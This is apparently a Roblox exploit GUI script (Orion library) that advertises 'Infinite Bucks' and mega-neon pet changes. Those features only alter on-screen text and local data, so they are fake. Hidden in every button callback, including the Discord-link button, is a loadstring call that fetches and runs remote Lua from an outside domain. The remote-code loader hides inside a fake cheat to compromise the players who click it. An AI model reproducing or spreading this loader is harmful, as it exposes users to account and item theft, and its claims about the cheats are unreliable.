-- Create a tab for Infinite Bucks
local InfiniteBucksTab = Window:MakeTab({
    Name = "Infinite Bucks 💸",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

InfiniteBucksTab:AddTextbox({
    Name = "Enter Amount (1 - 999999999)",
    Default = "1",
    TextDisappear = true,
    Callback = function(value)
        AmountToSet = tonumber(value)
    end
})

InfiniteBucksTab:AddButton({
    Name = "Click to load chosen amount of Bucks 💸 ",
    Callback = function()
        if AmountToSet and AmountToSet >= 1 and AmountToSet <= 999999999 then
            local Local = game.Players.LocalPlayer
            Local.PlayerGui.BucksIndicatorApp.CurrencyIndicator.Container.Amount.Text = tostring(AmountToSet)
            print("Infinite Bucks activated: Amount set to " .. AmountToSet)
        else
            print("Invalid amount! Please enter a value between 1 and 999999999.")
        end
        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
    end
})

InfiniteBucksTab:AddParagraph("Script successfully loaded ❗", "Enjoy the Script! YouTube is unknown. 😁")

local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]

-- Create a tab for MFR-NFR
local MFRNFRTab = Window:MakeTab({
    Name = "MFR-NFR 🔄",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

MFRNFRTab:AddButton({
    Name = "MFR Changer-(Inventory ❇️)",
    Callback = function()
        for i, v in pairs(playerData.inventory.pets) do
            v.properties.rideable = true
            v.properties.flyable = true
            v.properties.mega_neon = true
        end
        print("MFR Changer action executed: Pets set to rideable, flyable, and mega neon.")
        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
    end
})

MFRNFRTab:AddButton({
    Name = "NFR Changer-(Inventory ❇️)",
    Callback = function()
        for i, v in pairs(playerData.inventory.pets) do
            v.properties.rideable = true
            v.properties.flyable = true
            v.properties.neon = true
        end
        print("NFR Changer action executed: Pets set to rideable, flyable, and neon.")
        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
    end
})

MFRNFRTab:AddParagraph("Script successfully loaded ❗", "Enjoy the Script! YouTube is unknown. 😁")

-- Create a tab for Error/Bugs
local ErrorBugsTab = Window:MakeTab({
    Name = "Error/Bugs!? 🐞",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

ErrorBugsTab:AddParagraph("Private Server Error ❗", "Being in a private server can cause a lot of the main features of the script to not work. Please take this as a note if you're having problems with something not working; this is probably the cause of it.")
ErrorBugsTab:AddParagraph("My Discord Server 🌍", "Please join my discord server if you need help with bugs/errors.")

ErrorBugsTab:AddButton({
    Name = "Copy link to Discord Server 🌍",
    Callback = function()
        local discordLink = "https://discord.gg/123456" -- Replace with your actual Discord server link
        setclipboard(discordLink)
        print("Error/Bug reported: Link copied to clipboard!")
        OrionLib:MakeNotification({
            Name = "Link Copied! 📋",
            Content = "The Discord server link has been copied to your clipboard! Join us for help❗",
            Time = 5
        })
        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2 .lua", true))() -- Added here
    end
})

-- Initialize the Orion Library
OrionLib:Init()
